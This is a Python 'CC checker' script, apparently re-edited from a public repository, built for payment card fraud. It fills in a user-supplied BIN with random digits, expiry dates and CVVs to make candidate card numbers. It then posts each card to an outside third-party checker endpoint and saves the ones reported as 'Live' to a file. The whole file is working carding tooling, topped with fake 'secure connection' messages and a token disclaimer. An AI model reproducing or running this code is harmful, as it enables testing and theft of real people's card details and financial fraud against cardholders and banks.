#!/usr/bin/env python3
#Reedit by: Udyz
#Original repo: https://github.com/l0nzs3c/CCV-CC-Checker-By-Lenard/
import requests,sys
from colorama import init
import random
import os
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init()
g = "\033[0;32m"
r = "\033[0;31m"
y = "\033[0;33m"
c = "\033[36m"
d = "\033[0m"
o = "%s[%s*%s]%s" %(g,c,g,d)
oO = "%s[%s+%s]%s" %(g,c,g,d)
yo = "%s[%s!%s]%s" %(g,y,g,d)
def cls():
    os.system('cls' if os.name=='nt' else 'clear')
    #CODED BY LENARD

    print(str(oO)+" %sEstablishing Secure Connection" %(d))
    time.sleep(1)
    print(str(oO)+" %sConnection Status: Connected!" %(d))
    time.sleep(1)
    print(str(yo)+" %sDatabase Braintree Checking!" %(d))
    time.sleep(1)
    print(str(oO)+" %sBraintree API" %(d))
    time.sleep(0.1)
    print(str(oO)+" %sConnected to API" %(d))
    time.sleep(1)
    print(str(o)+" %sEnter your Bin mga lodi! HAHAHAHAHA" %(d))
cls()
fname = []
def ccgen():
	fname = 'ccgen.txt'
	try:
		os.remove(fname)
	except FileNotFoundError:
		pass
	FBin = input(str(o)+' Bin%s: ' %(d))
	FBin.replace(' ' , '')
	FBin.replace('x' , '')
	FBin.replace('X' , '').replace('!','').replace('@', '').replace('#', '').replace('$', '').replace('%', '').replace('^', '').replace('&', '').replace('*', '').replace('(', '').replace('-', '').replace('_', '').replace('=', '').replace(';', '').replace(':', '').replace("'", "").replace('"', '').replace('\\', '').replace(',', '').replace('.', '').replace('/', '').replace('<', '').replace('>', '')
	Bin = FBin.replace(' ' , '')
	Bin = Bin.replace('x' ,'')
	Bin = Bin.replace('X', '')
	Bin = Bin[:6]
	url = "http://www.lookupbin.com/bin?bin=" + Bin
	response = requests.get(url, verify=False)
	Network = []
	if "is not a known BIN" in (response.text):
		print("\n", Bin, "is not a known BIN")
		check = input("\nWARNING....!..The BIN is not proper BIN. CC with these BIN may not works properly \n Do you want to change the BIN (yes/no | Default:yes): ")
		if check in ['n', 'N', 'No', 'no', 'NO']:
			quit()
		else:
			return ccgen()
	else:
		if "Network" in (response.text):
			Network = str((response.text).split("Network:",2)[-1]).split("</div></div>", 1)[0][28:]
			print(str(o)+" Network%s: " %(d) + Network)

		if "Brand" in (response.text):
			Brand = str((response.text).split("Brand:",2)[-1]).split("</div></div>", 1)[0][28:]
			print(str(o)+" Brand%s: " %(d) + Brand)

		if "Type" in (response.text):
			Type = str((response.text).split("Type:",2)[-1]).split("</div></div>", 1)[0][28:]
			print(str(o)+" Type%s: " %(d) + Type)

		if "Prepaid" in (response.text):
			Prepaid = (response.text).split("Prepaid:",2)[-1].split("</div></div>", 1)[0][28:]
			print(str(o)+" Prepaid%s: " %(d) + Prepaid)

		if 'Country:' in (response.text):
			Country = str((response.text).split("Country:",2)[-1]).split("</div></div>", 1)[0][28:]
			print(str(o)+" Country%s: " %(d) + Country)

		if "Bank:" in (response.text):
			Bank = ((response.text).split("Bank:",2)[-1]).split("</div></div>", 1)[0][28:]
			print(str(o)+" Bank%s: " %(d) + Bank)
		print (str(r)+"\nWARNING....!we are not responsible for your malicious activities..!"+str(d))

	if (len(FBin) < 16):
		FBin = FBin+((16-(len(FBin)))*'x')
	
	TBin = FBin
	nocc = int(input(str(o)+' Amount Credit Cards%s: '%(d)))
	print (str(oO)+" %sGenerated Credit Cards "%(d))
	print (str(o)+" %sCredit Card No | Month | Years | CVV | Card Status | Charge (If Credit cards live)"%(d))
	print (str(o)+" %sStart Time: " %(d) , time.strftime('%H:%M:%S')+'\n')
	start_time = time.time()
	for x in range(0, nocc):
		for i in range(len(TBin)):

			n = str(random.randint(0, 9))
			m = str(random.randint(1, 12))
			if (len(m) == 1):
				m = '0' + m
			y = str(random.randint(2021, 2025))
			if (Network == 'amex'):
				cv = str(random.randint(1000, 9999))
			else:
				cv = str(random.randint(100, 999))		

			c = TBin[i]
			if (c == 'x' or c == 'X'):
				FBin = FBin[:i] + str(n) + FBin[i+1:]

		cc = FBin + '|' + m + '|' +  y + '|' + cv
		with open(fname, 'a+') as f:
			f.write(cc+'\n')
	ccchecker(fname)
	try:
		os.remove(fname)
	except FileNotFoundError:
		pass
	print(d+"\n[-] End Time: ", time.strftime('%H:%M:%S'))
	try:
		time.sleep(100)
	except KeyboardInterrupt:
		print('\n[+] Exiting, have fun day ;)')
def ccchecker(fname):
	cookie = ''
	file = open(fname).read().splitlines()
	for cc in file:
		try:
			url = 'http://kea3.ke1.nl//ccn1/alien07.php'
			form = {'ajax':'1','do':'check','cclist':str(cc)}

			response = requests.post(url, form, stream = True)

			if "Live" in response.text:
				print(d+cc+g+' | Live  | Charge $' + str(response.text).split('$')[1].split('</font>')[0].replace('\n', ''))
				with open('live.txt', 'a+') as f:
					f.write(cc+'\n')
			elif "Unknown" in response.text:
				print(d+cc+c+' | Unknown')
				with open('unknown.txt', 'a+') as f:
					f.write(cc+'\n')
			else:
				print(d+cc+r+' | Die')
				with open('die.txt', 'a+') as f:
					f.write(cc+'\n')
		except KeyboardInterrupt:
			pass
if __name__ == '__main__':
	ccgen()
	print('\nIf there is no Live BINs try once again by increasing the number of Card needed')

#OOPS SCRIPT KIDDIE Xd